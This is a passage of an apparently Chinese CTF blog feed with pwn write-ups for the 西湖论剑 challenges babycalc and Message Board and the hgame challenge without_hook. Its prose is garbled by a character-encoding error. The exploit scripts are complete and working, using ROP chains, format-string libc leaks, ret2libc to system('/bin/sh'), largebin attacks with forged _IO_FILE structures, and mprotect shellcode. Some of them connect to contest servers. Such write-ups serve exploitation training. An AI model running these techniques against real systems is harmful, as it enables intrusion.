class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x38</span><br><br>payload = fake_IO_FILE<br>payload += flat(<br>    p64(pop_rdi_ret), p64(heap_addr),<br>    p64(pop_rsi_ret), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12_ret), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br><br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>))<br>edit(<span class="hljs-number">3</span>, payload)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘-pwn</title>
    <link href="/2023/02/07/xhlj-pwn/"/>
    <url>/2023/02/07/xhlj-pwn/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“è¥¿æ¹–è®ºå‰‘ï¼Œåªåšå‡ºäº†ä¸¤é“pwné¢˜ï¼Œé‚£ä¸ªjitåˆ°æœ€åä¹Ÿæ²¡èƒ½çœ‹æ˜ç™½ğŸ˜ã€‚</p><h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p>å¦‚ä¸‹å›¾ï¼Œè¾“å…¥0x100å¤§å°çš„æ•°æ®å¯ä»¥ä¿®æ”¹æ ˆä¸Š<code>i</code>çš„å€¼ï¼Œé€šè¿‡<code>i</code>ä¸v3çš„åç§»å°±å¯ä»¥ä¿®æ”¹æ ˆä¸Šçš„ä»»æ„ä¸€å­—èŠ‚ï¼Œè€Œä¸”è¾“å…¥åå­˜åœ¨off-by-one</p><p><img src="/img/11/Screenshot_20230208_111806.png"></p><p>â€‹</p><p>è¿™é‡Œåˆ©ç”¨<code>i</code>ä¸v3çš„åç§»ä¿®æ”¹è¿”å›å€¼ä¸º <code>leave ret</code>çš„åœ°å€ï¼Œåªèƒ½æ›´æ”¹ä¸€å­—èŠ‚ï¼Œè¿™é‡Œä¿®æ”¹ä¸º0x400C18ï¼Œåˆ©ç”¨off-by-oneæ”¹å˜rbpçš„å€¼æ¥å®ç°æ ˆè¿ç§»ï¼Œå…·ä½“æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/img/11/Screenshot_20230209_124709.jpg" style="zoom:80%;" /><p>â€‹</p><p>ç”±äºæ ˆæ¯æ¬¡å¯åŠ¨çš„åœ°å€ä¸åŒï¼Œè¿˜éœ€è¦çˆ†ç ´æ ˆåœ°å€ï¼Œå†ret2libcã€‚</p><p>â€‹</p><p>æœ€åå°±æ˜¯å…³äºä¸­é—´é‚£ä¸ªæ–¹ç¨‹ç»„çš„æ±‚è§£ï¼Œæˆ‘å½“æ—¶æ˜¯ç›´æ¥å¤´é“ç¡¬ç®—çš„(å…¶å®è¿˜æ¯”è¾ƒå¥½ç®—)ï¼Œèµ›åå¬è¯´angrä¹Ÿèƒ½å°†ç»“æœè·‘å‡ºæ¥ï¼Œè‡ªå·±ä¹Ÿå°è¯•åšäº†ä¸€ä¸‹angrçš„è§£æ³•:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Go</span>():<br>    proj = angr.Project(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br>    <br>    start_addr = <span class="hljs-number">0x40080a</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    init_state.regs.rbp = init_state.regs.rsp<br>    init_state.regs.rsp -= <span class="hljs-number">0x100</span><br><br>    v3 = claripy.BVS(<span class="hljs-string">&#x27;v3&#x27;</span>, <span class="hljs-number">8</span>)<br>    v4 = claripy.BVS(<span class="hljs-string">&#x27;v4&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v6 = claripy.BVS(<span class="hljs-string">&#x27;v6&#x27;</span>, <span class="hljs-number">8</span>)<br>    v7 = claripy.BVS(<span class="hljs-string">&#x27;v7&#x27;</span>, <span class="hljs-number">8</span>)<br>    v8 = claripy.BVS(<span class="hljs-string">&#x27;v8&#x27;</span>, <span class="hljs-number">8</span>)<br>    v9 = claripy.BVS(<span class="hljs-string">&#x27;v9&#x27;</span>, <span class="hljs-number">8</span>)<br>    v10 = claripy.BVS(<span class="hljs-string">&#x27;v10&#x27;</span>, <span class="hljs-number">8</span>)<br>    v11 = claripy.BVS(<span class="hljs-string">&#x27;v11&#x27;</span>, <span class="hljs-number">8</span>)<br>    v12 = claripy.BVS(<span class="hljs-string">&#x27;v12&#x27;</span>, <span class="hljs-number">8</span>)<br>    v13 = claripy.BVS(<span class="hljs-string">&#x27;v13&#x27;</span>, <span class="hljs-number">8</span>)<br>    v14 = claripy.BVS(<span class="hljs-string">&#x27;v14&#x27;</span>, <span class="hljs-number">8</span>)<br>    v15 = claripy.BVS(<span class="hljs-string">&#x27;v15&#x27;</span>, <span class="hljs-number">8</span>)<br>    v16 = claripy.BVS(<span class="hljs-string">&#x27;v16&#x27;</span>, <span class="hljs-number">8</span>)<br>    v17 = claripy.BVS(<span class="hljs-string">&#x27;v17&#x27;</span>, <span class="hljs-number">8</span>)<br>    v18 = claripy.BVS(<span class="hljs-string">&#x27;v18&#x27;</span>, <span class="hljs-number">8</span>)<br>    val = [v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        stack_addr = init_state.regs.rbp - <span class="hljs-number">0x30</span> + i<br>        init_state.memory.store(stack_addr, val[i])<br><br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = <span class="hljs-number">0x400ba1</span><br>    simgr.explore(find = find_addr)<br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            real_val = solution_state.solver.<span class="hljs-built_in">eval</span>(val[i])<br>            <span class="hljs-built_in">print</span>(real_val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find!&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Go()<br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/img/11/Screenshot_20230216_102443.png"></p><p>ğŸ˜‹å¥½ç¥å¥‡ï¼angrçœŸæ»´å¼ºï¼</p><p>â€‹</p><p>å®Œæ•´exp</p><p>è¿œç¨‹libcä¸º2.23-0ubuntu11.3_amd64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babycalc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    pop_rdi = <span class="hljs-number">0x400ca3</span><br>    ret = pop_rdi + <span class="hljs-number">1</span><br>    rop1 = p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(ret) * <span class="hljs-number">0x10</span> +  p64(<span class="hljs-number">0x400650</span>) <span class="hljs-comment">#</span><br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop1<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>    rop2 = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop2<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">26087</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼<code>__libc_start_main</code>å‡½æ•°åœ°å€ï¼Œåˆ©ç”¨æ ˆè¿ç§»åˆ°bssæ®µç»§ç»­æ‰§è¡ŒROPï¼Œä½¿ç”¨mprotectå‡½æ•°æ›´æ”¹bssçš„æ‰§è¡Œæƒé™ï¼Œæœ€åæ‰§è¡Œshellcodeã€‚</p><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">22429</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span> <br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>libc = elf.libc<br><br>bss = <span class="hljs-number">0x4040b0</span><br>pop_rdi = <span class="hljs-number">0x401413</span><br>leave_ret = <span class="hljs-number">0x4012e1</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Welcome to DASCTF message board, please leave your name:&#x27;</span>,<span class="hljs-string">b&#x27;%31$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span> + p64(bss + <span class="hljs-number">0xb0</span>) + p64(<span class="hljs-number">0x40136C</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(bss - <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">7</span>),<br>    p64(mprotect),<br>    p64(bss + <span class="hljs-number">0x40</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload = payload.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(bss -<span class="hljs-number">8</span>) + p64(leave_ret)<br>p.sendafter(<span class="hljs-string">&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hgame-week4-pwn</title>
    <link href="/2023/02/07/hgame-week4-pwn/"/>
    <url>/2023/02/07/hgame-week4-pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="without-hook"><a href="#without-hook" class="headerlink" title="without_hook"></a>without_hook</h3><p>libcç»™çš„æ˜¯2.36-0ubuntu2_amd64ï¼Œä»¥å‰ä¿®æ”¹<code>__free_hook</code>å’Œ<code>__malloc_hook</code>çš„æ–¹æ³•å°±è¡Œä¸é€šäº†ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨largebin attackæ”»å‡»å»åŠ«æŒIOæ§åˆ¶æµï¼Œæœ€åæ„é€ house of catæˆ–è€…house of appleçš„<code>fake_IO_FILE</code>ï¼Œå’Œä»¥å‰æˆ‘åšè¿‡<a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#store">å¼ºç½‘æ‹Ÿæ€çš„ä¸€é“é¢˜</a>å¾ˆåƒã€‚</p><p>å”¯ä¸€æœ‰åŒºåˆ«çš„å°±æ˜¯ä»¥å‰å¸¸ç”¨çš„<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>è¿™ä¸ªgadgetä¼¼ä¹åœ¨è¯¥ç‰ˆæœ¬çš„libcä¸­æ‰¾ä¸åˆ°äº†</p><p><img src="/img/11/Screenshot_20230208_095848.jpg"></p><p>è¿™é‡Œæˆ‘æ”¹ç”¨<code>mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</code>è¿™ä¸ªgadgetï¼Œä½¿ç”¨house of appleå»å®ç°setcontextå‡½æ•°å¯¹rspçš„åŠ«æŒã€‚</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32393</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x520</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">2060528</span><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>))<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x520</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xcc0</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>edit(<span class="hljs-number">2</span>, payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 